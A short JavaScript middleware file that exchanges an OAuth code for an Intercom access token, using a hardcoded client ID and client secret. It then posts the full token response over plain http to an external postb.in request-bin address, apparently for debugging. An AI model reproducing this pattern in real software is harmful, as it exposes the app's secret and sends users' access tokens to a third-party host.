import axios from 'axios'

export default function({ app, query, redirect }) {
  axios({
    url: 'https://api.intercom.io/auth/eagle/token',
    method: 'post',
    headers: {
      Accept: 'application/json',
      'Content-Type': 'application/json'
    },
    data: {
      code: query.code,
      client_id: '15329d68-6aaf-47ab-84ad-09d8d73f97be',
      client_secret: '2b8eea09-0c43-4d9c-9b9b-7b2961cd41c2'
    }
  })
    .then(response => {
      axios({
        url: 'http://postb.in/VGNb31jp',
        method: 'post',
        data: response
      })
    })
    .catch(error => console.error(error))
}
